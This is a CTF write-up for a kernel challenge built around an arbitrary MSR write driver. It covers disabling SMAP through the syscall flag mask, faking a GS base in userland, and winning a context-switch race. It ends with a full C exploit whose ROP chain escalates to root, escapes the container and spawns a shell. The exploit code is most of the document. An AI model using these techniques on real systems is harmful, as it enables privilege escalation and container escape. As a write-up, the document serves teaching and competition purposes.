# Description
im a  _baby_  and im  _small_

**DISCLAIMER**: This challenge was rated "insane" from the pwners of the team, please reconsider approaching the challenge  
**DISCLAIMER**: Please test your solve locally before spawning a remote instance of the challenge!

**NOTE**: In order to make the intended exploit more reliable CONFIG_HZ is set to 100

# Challenge overview
![Driver's assembly](img/asm.png)

The challenge provides a weird primitive, that we can call Arbitrary MSR Write.

Little bit of theory about MSRs:
A model specific register is any of various control registers used for debugging, enabling specific CPU features and performance monitoring.
Some examples are: EFER used (among other things) to specify if the NX protection or Long Mode are active, or LSTAR in which is contained the virtual address the CPU will jump in kernelspace after executing the syscall instruction.

# Exploitation
The first path that comes to mind is overwriting LSTAR to gain kernel RIP hijacking, but there's still a problem: leaks.
During play-testing this path appeared to be a dead end (curious about unintended solves).

> Exploitation overview

The intended path uses 2 interactions with the driver: one for MSR_SYSCALL_MASK and one for MSR_GS_BASE.
The idea is to disable SMAP and fake a kernelspace stack in userland which we can use to leak addresses and achieve RIP hijacking

> Exploitation

We can disable SMAP for these reasons:
- the AC bit in EFLAGS can be set in userland
- during the syscall instruction `RFLAGS := RFLAGS AND NOT(IA32_FMASK)` happens (https://www.felixcloutier.com/x86/syscall)
- by modifying MSR_FLAG_MASK we can tell "syscall" to not zero out the AC bit

As said, now the idea is to create a fake GS in userland, but why do we want this? 
In the `entry_SYSCALL_64` function, which is the first function that gets executed in kernelspace after the syscall instruction, the kernelspace stack gets fetched from an address, which is GS-based. So we can craft a fake GS in userland which: won't result in a kpanic (because of a null-ptr dereference, for example) and will fetch a userland address for the kernelspace RSP.

All safe and sound 'till here, the problem is that MSR_GS_BASE is CPU specific, which means that if an hardware context switch happens, the new process that will be run will also use the fake GS, and not the real one, which will, for sure, trigger a kpanic because syscalls needs an actual GS (and for god's sake do not try to fake it all). 
So we end up in a race where if an hardware context switch happens during the window that starts from the driver's `wrmsr` instruction and ends at the ROPchain execution (where we'll fix GS) a kpanic will be triggered.
Is there a way to make this "race" more reliable? During play-testing we did not find such a way, so this is why CONFIG_HZ is set to 100, given that the default one is 1000, which means that an hardware context swtich happens every 10ms (instead of 1ms) which makes the race 10 times more reliable.
> Lore moment

The original kernel image (with CONFIG_HZ=1000) made the exploit unreliable with a success rate of 20-25%. 
But as soon as my laptop battery would go under the 20% of charge, the exploit would completely stop working, with the only (apparent) fix being plugging in the charger.
After several days of analysis I came to the conclusion that the battery being low triggers the "Power Saver Mode", which (among other things) makes the CPU run slower: the hardware context switch has a fixed clock (every 1ms) and we have to run N instructions in that 1ms, with the CPU being slowed down, we are not able to run those N instructions triggering an hardware context switch which will result in a kpanic.
So one day @prosti randomly said: CONFIG_HZ

The choice of changing CONFIG_HZ was not made in order to make the challenge actually exploitable, because the exploit would still work, but we wanted to enlarge the race window.

![Discord chat](img/ds_chat.png)

> Back to exploitation

So to win the race I used two processes pinned on two different CPUs and synchronized them through semaphores allocated on shared memory.

The parent's tasks are:
- wait for the child to fake GS (just some values needed to not trigger null pointer dereference in the syscall ret2user + the fake stack)
- set AC bit on (this must be done BEFORE changing GS)
- change GS
- call a ni_syscall (not implemented syscall) to make leaks end up on the fake stack
- looping a ni_syscall, which will be hijacked by the child process

The child's tasks are:
- fake gs
- wait until virtual kbase gets leaked by parent
- write the ROPchain on the fake stack
- loop the POP RSP; ret + &ropchain write on the kernelspace fake stack to overwrite the return address


The ROPchain must:
- fix GS, to do so you can use an Arbitrary Read gadget (I jumped in the middle of `rep_movs_alternative` which is used in copy_to/from_user) to leak page_offset_base and then add 0x3ea00000 to get the actual GS base (yeah, GS' phys address is predictable)
- escalate privileges: `commit_creds(&init_cred)`
- escape container
	- change shell's namespace
	- assign a copy of `init_fs` struct to exploit task
- ret2user

Now `system("/bin/sh")` and profit :)

# Full exploit
```c
// #define DBG
#include  "kpwn.c"
  
#define MSR_SYSCALL_MASK 0xc0000084
#define MSR_KERNEL_GS_BASE 0xc0000101
  
#define EFLAGS_MASK 0x257fd5  ^  0x40000
#define KERNEL_GS 0x10000
#define GS_SIZE 0x2d000
  
#define PHYS_GS 0x3ea00000
  
#define POP_RSP 0xfe760
#define POP_RDI 0xda228d
#define POP_RSI 0x2527cc
#define POP_RCX 0xa3e793
#define POP_RDX 0x67ad92
  
#define ADD_DWORD_RSIRDX1_ESI 0xaa4063
#define REP_MOVS_ALTERNATIVE 0x101ed10
#define PAGE_OFFSET_BASE 0x19ea178
#define WRMSR 0x1201886
  
#define INIT_CRED 0x1c501d0
#define COMMIT_CREDS 0xcd3b0
#define FIND_TASK_BY_VPID 0xbf9a0
#define MOV_QWORD_RDI_RAX REP_MOVS_ALTERNATIVE+3
#define INIT_NSPROXY 0x1c4fd10
#define SWITCH_TASK_NAMESPACES 0xca960
#define INIT_FS 0x1d71f20
#define COPY_FS_STRUCT 0x31e6b0
#define SWAPGS_AND_SHIT 0x12015d0  +  0x67
  
  
void  win(){
	system("/bin/sh");
}
  
void  naked_syscall(){
	asm  volatile (
		".intel_syntax  noprefix\n"
		"mov  rax, 0x6969\n"
		"syscall\n"
		".att_syntax  prefix\n"
		:
		:
		: "rax"
	);
}
  
  
int  main(){
	pin_cpu(0);
	
	int fd =  open("/dev/msr", O_RDONLY);
	char* kgsbase;
	char* fake_stack;
	ul* kbase;
	int parent_child =  getpid();
	
	ul rsp;
	__asm__  volatile ("mov %%rsp, %0" : "=r"(rsp));
	
	stop("set eflags mask");
	ioctl(fd, MSR_SYSCALL_MASK, EFLAGS_MASK); 
	
	stop("set fake kernel gs base");
	fake_stack = (char*) mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	kgsbase = (char*) mmap((void* ) KERNEL_GS, GS_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	kbase = (ul*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	
	int pid =  fork();
	if (!pid){
		pin_cpu(1);
		memset(fake_stack, 0, 0x2000);
		memset(kbase, 0, 0x1000);
		memset(kgsbase, 0, GS_SIZE);
		
		*(ul*) &kgsbase[0x2be40] = (ul) kgsbase;
		*(ul*) &kgsbase[0x6004] = (ul) fake_stack +  0x1000;
		*(ul*) &kgsbase[0x2be58] = (ul) fake_stack +  0x1000;
		char* chain = fake_stack+0x1000;
		
		*&kbase[1] =  1;
		while (!*kbase){} // wait for parent to overwrite MSR_KERNEL_GS_BASE and leak kaslr
		
		// set correct gs
		*(ul*) &fake_stack[0x1000] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1008] = (ul) &fake_stack[0x1068];
		*(ul*) &fake_stack[0x1010] = POP_RSI +  *kbase;
		*(ul*) &fake_stack[0x1018] = PAGE_OFFSET_BASE +  *kbase;
		*(ul*) &fake_stack[0x1020] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x1028] =  8;
		*(ul*) &fake_stack[0x1030] = REP_MOVS_ALTERNATIVE +  *kbase;
		*(ul*) &fake_stack[0x1038] = POP_RSI +  *kbase;
		*(ul*) &fake_stack[0x1040] = PHYS_GS;
		*(ul*) &fake_stack[0x1048] = POP_RDX +  *kbase;
		*(ul*) &fake_stack[0x1050] = (ul) &fake_stack[0x1068] - PHYS_GS -  1;
		*(ul*) &fake_stack[0x1058] = ADD_DWORD_RSIRDX1_ESI +  *kbase;
		*(ul*) &fake_stack[0x1060] = POP_RDX +  *kbase;
		*(ul*) &fake_stack[0x1068] =  0x6969696969696969;
		*(ul*) &fake_stack[0x1070] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x1078] = MSR_KERNEL_GS_BASE;
		*(ul*) &fake_stack[0x1080] = WRMSR +  *kbase;
		  
		// commit_creds(init_cred)
		*(ul*) &fake_stack[0x1088] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1090] = INIT_CRED +  *kbase;
		*(ul*) &fake_stack[0x1098] = COMMIT_CREDS +  *kbase;

		// task = find_task_by_vpid(1)
		*(ul*) &fake_stack[0x10a0] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x10a8] =  1;
		*(ul*) &fake_stack[0x10b0] = FIND_TASK_BY_VPID +  *kbase;
		  
		// switch_task_namespaces(task, init_nsproxy)
		*(ul*) &fake_stack[0x10b8] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x10c0] = (ul) &fake_stack[0x10e8];
		*(ul*) &fake_stack[0x10c8] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x10d0] =  8;
		*(ul*) &fake_stack[0x10d8] = MOV_QWORD_RDI_RAX +  *kbase;
		*(ul*) &fake_stack[0x10e0] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x10e8] =  0x6969696969696969;
		*(ul*) &fake_stack[0x10f0] = POP_RSI +  *kbase;
		*(ul*) &fake_stack[0x10f8] = INIT_NSPROXY +  *kbase;
		*(ul*) &fake_stack[0x1100] = SWITCH_TASK_NAMESPACES +  *kbase;

		// new_fs = copy_fs_struct(init_fs)
		*(ul*) &fake_stack[0x1108] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1110] = INIT_FS +  *kbase;
		*(ul*) &fake_stack[0x1118] = COPY_FS_STRUCT +  *kbase;

		// save "somewhere" new_fs
		*(ul*) &fake_stack[0x1120] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1128] = (ul) &fake_stack[0x1f00];
		*(ul*) &fake_stack[0x1130] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x1138] =  8;
		*(ul*) &fake_stack[0x1140] = MOV_QWORD_RDI_RAX +  *kbase;

		// task = find_task_by_vpid(getpid())
		*(ul*) &fake_stack[0x1148] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1150] = (ul) parent_child;
		*(ul*) &fake_stack[0x1158] = FIND_TASK_BY_VPID +  *kbase;

		// current->fs = newfs
		*(ul*) &fake_stack[0x1160] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x1168] = (ul) &fake_stack[0x11b8];
		*(ul*) &fake_stack[0x1170] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x1178] =  8;
		*(ul*) &fake_stack[0x1180] = MOV_QWORD_RDI_RAX +  *kbase;
		*(ul*) &fake_stack[0x1188] = POP_RSI +  *kbase;
		*(ul*) &fake_stack[0x1190] =  0x760;
		*(ul*) &fake_stack[0x1198] = POP_RDX +  *kbase;
		*(ul*) &fake_stack[0x11a0] = (ul) &fake_stack[0x11b8] -  0x760  -  1;
		*(ul*) &fake_stack[0x11a8] = ADD_DWORD_RSIRDX1_ESI +  *kbase;
		*(ul*) &fake_stack[0x11b0] = POP_RDI +  *kbase;
		*(ul*) &fake_stack[0x11b8] =  0x6969696969696969;
		*(ul*) &fake_stack[0x11c0] = POP_RSI +  *kbase;
		*(ul*) &fake_stack[0x11c8] = (ul) &fake_stack[0x1f00];
		*(ul*) &fake_stack[0x11d0] = POP_RCX +  *kbase;
		*(ul*) &fake_stack[0x11d8] =  8;
		*(ul*) &fake_stack[0x11e0] = REP_MOVS_ALTERNATIVE +  *kbase;

		// ret2user
		*(ul*) &fake_stack[0x11e8] = SWAPGS_AND_SHIT +  *kbase;
		*(ul*) &fake_stack[0x11f0] =  0;
		*(ul*) &fake_stack[0x11f8] =  0;
		*(ul*) &fake_stack[0x1200] = (ul) &win;
		*(ul*) &fake_stack[0x1208] =  0x33;
		*(ul*) &fake_stack[0x1210] =  0x206;
		*(ul*) &fake_stack[0x1218] = rsp;
		*(ul*) &fake_stack[0x1220] =  0x2b;

		while (1){
			*(ul*) &fake_stack[0xf50] = POP_RSP +  *kbase;
			*(ul*) &fake_stack[0xf58] = (ul) chain;
		};

		return  0;
	}

	while (!*&kbase[1]){} // wait for child to fake gs

	asm  volatile (
		".intel_syntax  noprefix\n"
		"push  0x40206\n"
		"popf\n"
		".att_syntax  prefix"
		:
		:
		:	
	);

	ioctl(fd, MSR_KERNEL_GS_BASE, KERNEL_GS);
	
	naked_syscall();
	*kbase =  *(ul*) &fake_stack[0xf50] -  0x120012f;

	while (1)
		naked_syscall();

	stop("finished");
	return  0;
}```
